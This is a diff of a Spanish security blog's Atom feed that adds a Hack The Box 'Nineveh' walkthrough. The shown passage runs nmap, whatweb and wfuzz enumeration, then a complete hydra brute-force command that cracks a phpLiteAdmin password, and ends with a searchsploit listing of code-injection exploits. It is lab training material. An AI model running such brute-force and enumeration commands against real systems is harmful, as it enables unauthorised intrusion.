@@ -1,4 +1,577 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-27T15:16:14-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Mirai</title><link href="http://localhost:4000/htb-mirai/" rel="alternate" type="text/html" title="Hack The Box Mirai" /><published>2021-11-27T00:00:00-06:00</published><updated>2021-11-27T00:00:00-06:00</updated><id>http://localhost:4000/htb-mirai</id><content type="html" xml:base="http://localhost:4000/htb-mirai/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-mirai/banner-mirai.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-28T22:10:03-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Nineveh</title><link href="http://localhost:4000/htb-nineveh/" rel="alternate" type="text/html" title="Hack The Box Nineveh" /><published>2021-11-28T00:00:00-06:00</published><updated>2021-11-28T00:00:00-06:00</updated><id>http://localhost:4000/htb-nineveh</id><content type="html" xml:base="http://localhost:4000/htb-nineveh/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/banner-nineveh.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;nineveh&quot;&gt;Nineveh&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.43.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.43
+PING 10.10.10.43 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.43&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.43: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;136 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.43 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 135.820/135.820/135.820/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.43 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-27 19:50 CST
+Initiating SYN Stealth Scan at 19:50
+Scanning 10.10.10.43 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 80/tcp on 10.10.10.43
+Discovered open port 443/tcp on 10.10.10.43
+Completed SYN Stealth Scan at 19:50, 26.52s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.43
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2021-11-27 19:50:21 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s
+Not shown: 65533 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT    STATE SERVICE REASON
+80/tcp  open  http    syn-ack ttl 63
+443/tcp open  https   syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;26.61 seconds
+           Raw packets sent: 131087 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;924B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬───────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.43
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 80,443
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,443 10.10.10.43 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-27 19:52 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.43
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn'&lt;/span&gt;t have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/html&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;nineveh.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;HackTheBox Ltd/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Athens/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;GR
+| Not valid before: 2017-07-01T15:03:30
+|_Not valid after:  2018-07-01T15:03:30
+|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time
+
+&lt;/span&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;21.69 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos sólo los puerto 80 y 443. Dentro de los resultados de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, vemos el dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nineveh.htb&lt;/code&gt; el cual vamos a agregar a nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; y posteriormente, antes de visualizar el contenido vía web; vamos a observar a lo que nos enfrentamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://nineveh.htb/
+http://nineveh.htb/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.43]
+❯ whatweb https://nineveh.htb/
+https://nineveh.htb/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.43]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No vemos algún CMS (gestor de contenido), por lo que el sitio podría ser echo manualmente. Ahora si vamos el ver el contenido vía web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como no vemos nada interesante, trataremos de descubrir rutas dentro del servidor con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; y posteriormente con  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; para ambos servicios, tanto por HTTP como HTTPS:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-enum &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,443 10.10.10.43 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; webScan
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-27 20:26 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;nineveh.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.43&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT    STATE SERVICE
+80/tcp  open  http
+| http-enum: 
+|_  /info.php: Possible information file
+443/tcp open  https
+| http-enum: 
+|   /db/: BlogWorx Database
+|_  /db/: Potentially interesting folder
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;28.66 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para el puerto 80 tenemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/info.php&lt;/code&gt; y sobre el puerto 443 tenemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/db/&lt;/code&gt; que se encuentra relacionado con &lt;strong&gt;&lt;em&gt;BlogWorx Database&lt;/em&gt;&lt;/strong&gt;. Si tratamos de ingresar vía web al recurso, tenemos un panel de login de &lt;strong&gt;&lt;em&gt;phpLiteAdmin v1.9&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos ahora a utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;178 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://nineveh.htb/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://nineveh.htb/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000003021:   301        9 L      28 W       315 Ch      &quot;department&quot;                                                    
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 0
+Processed Requests: 32291
+Filtered Requests: 32290
+Requests/sec.: 0
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;49 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  https://nineveh.htb/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://nineveh.htb/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000000848:   301        9 L      28 W       309 Ch      &quot;db&quot;                                                            
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 111.4947
+Processed Requests: 45914
+Filtered Requests: 45913
+Requests/sec.: 411.8040
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos nuevos recursos, para el 80 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;department&lt;/code&gt; al cual si le echamos un ojo, tenemos otro panel de login:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A este punto, tenemos dos paneles de login, por lo que podriamos tratar de hacer SQLi; sin embargo, los sitios no son vulnerables, por lo que vamos a tratar de hacer fuerza bruta para obtener la contraseña y empezaremos con el puerto recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;db&lt;/code&gt; y la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hydra&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; none &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /usr/share/wordlists/rockyou.txt nineveh.htb https-form-post &lt;span class=&quot;s2&quot;&gt;&quot;/db/index.php:password=^PASS^&amp;amp;remember=yes&amp;amp;login=Log+In&amp;amp;proc_login=true:Incorrect password.&quot;&lt;/span&gt;
+Hydra v9.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 by van Hauser/THC &amp;amp; David Maciejak - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;this is non-binding, these &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; ignore laws and ethics anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2021-11-27 20:55:08
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:14344399&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~896525 tries per task
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;^PASS^&amp;amp;remember&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;&amp;amp;login&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Log+In&amp;amp;proc_login&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;:Incorrect password.
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 727.00 tries/min, 727 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:01h, 14343672 to &lt;span class=&quot;k&quot;&gt;do in &lt;/span&gt;328:50h, 16 active
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;443][http-post-form] host: nineveh.htb   login: none   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2021-11-27 20:57:05
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hablando un poco del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hydra&lt;/code&gt;, con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-l&lt;/code&gt; le indicamos un nombre de usuario, si es minúscula es que conocemos el usuario y con mayúscula le indicamos un diccionario; para este caso en concreto, no requerimos usuario ya que solo se tiene el campo de password, así que le ponemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;none&lt;/code&gt;. Con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-P&lt;/code&gt; le indicamos la contraseña y la ponemos en mayúscula ya que haremos uso de un diccionario, el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt;. Posteriormente el indicamos la dirección IP o el dominio, luego el método que se utilizar para tramitar la petición, para este caso es &lt;strong&gt;POST&lt;/strong&gt; y se lo indicamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https-form-post&lt;/code&gt; y por último entre comillas ponemos tres valores separados por dos puntos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt;, el primero corresponde al recurso donde se encuentra el panel de login, el segundo los datos que se tramitan y el tercero, algún indicador que nos ayude a validar si la contraseña es correcta o incorrecta. Esta información la podemos obtener de &lt;strong&gt;Inspeccionar&lt;/strong&gt; del navegador, que puede ser click secundario e &lt;strong&gt;Inspeccionar&lt;/strong&gt; o haciendo Ctrl + O en el navegador y después hacer una solicitud con cualquier contraseña.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que la contraseña es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password123&lt;/code&gt; y ya podemos ingresar (&lt;strong&gt;Nota&lt;/strong&gt;: Recordar guardar siempre las credenciales que encontremos).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Mediante la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; podriamos tratar de ver si existen exploits públicos asociados a &lt;strong&gt;&lt;em&gt;phpLiteAdmin 1.9&lt;/em&gt;&lt;/strong&gt; y encontramos algunos que básicamente nos indican como crear una nueva base de datos inyectando comandos en php.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit phpLiteAdmin 1.9
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+ Exploit Title                                                                                 |  Path
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                 | php/webapps/24044.txt
+phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                  | php/webapps/39714.txt
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Por el momento dejaremos este portal y ahora vamos a aplicar fuerza bruta para el panel de login sobre el puerto 80. Si probamos credenciales default dentro del panel de login, vemos que el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; existe, así que vamos a utilizar este usuario y para el ataque vamos a utilizar la herramienta &lt;a href=&quot;https://github.com/lanjelot/patator/blob/master/patator.py&quot;&gt;patator&lt;/a&gt;. Solo la descargamos, le damos permisos de ejecución y ejecutamos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/nineveh-web8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
